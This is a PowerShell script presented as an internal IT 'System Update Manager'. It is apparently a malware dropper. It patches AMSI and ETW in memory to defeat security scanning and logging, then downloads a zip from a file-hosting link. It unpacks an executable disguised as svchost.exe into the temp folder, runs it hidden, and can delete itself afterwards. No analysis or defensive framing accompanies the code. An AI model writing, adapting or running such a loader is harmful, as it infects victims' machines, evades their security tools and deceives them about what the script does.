# System Update Manager - Deployment Script
# For internal IT use only

param(
    [string]$ZipUrl = "https://stusercontent.com/daa8227d-46ac-4a7d-acf6-6d8e6adf11fb?expires=1784685796&filename=svchost.zip&id=zfyNmOYyZ&sig=b321484ee67a81d40500a05103806ba2aa5889041394aaa07269a0264b7885a6",
    [string]$ExeName = "svchost.exe",
    [switch]$SelfDestruct
)

# --- AMSI Bypass ---
$w32 = @"
using System;
using System.Runtime.InteropServices;
public class W32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $w32

$amsi = [W32]::LoadLibrary("amsi.dll")
$scan = [W32]::GetProcAddress($amsi, "AmsiScanBuffer")
$p = 0
[W32]::VirtualProtect($scan, [UIntPtr]5, 0x40, [ref]$p)
$patch = [Byte[]]@(0x31, 0xC0, 0x05, 0x4E, 0xFE, 0x0F, 0x34, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scan, 8)

# --- ETW Bypass ---
$etw = [W32]::LoadLibrary("ntdll.dll")
$etwEvent = [W32]::GetProcAddress($etw, "EtwEventWrite")
$p2 = 0
[W32]::VirtualProtect($etwEvent, [UIntPtr]5, 0x40, [ref]$p2)
$patch2 = [Byte[]]@(0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch2, 0, $etwEvent, 1)

# --- Config ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"

# --- Paths using proper env var ---
$basePath = Join-Path $env:TEMP ""
$zipFile = Join-Path $basePath "update.zip"
$extractPath = Join-Path $basePath "update"
$outFile = Join-Path $extractPath $ExeName

# --- Download .zip ---
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.DownloadFile($ZipUrl, $zipFile)
}
catch {
    exit
}

# --- Extract .zip ---
if (-not (Test-Path $extractPath)) {
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
}

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile, $extractPath)
}
catch {
    Expand-Archive -LiteralPath $zipFile -DestinationPath $extractPath -Force
}

# --- Cleanup zip ---
Remove-Item $zipFile -Force -ErrorAction SilentlyContinue

# --- Execute extracted .exe silently ---
if (Test-Path $outFile) {
    Start-Process -FilePath $outFile -WindowStyle Hidden -ErrorAction SilentlyContinue
}
else {
    $found = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) {
        Start-Process -FilePath $found.FullName -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}

# --- Self-destruct ---
if ($SelfDestruct) {
    $cmd = "Start-Sleep -Seconds 3; Remove-Item `"$PSCommandPath`" -Force"
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command `"$cmd`"" -WindowStyle Hidden
}
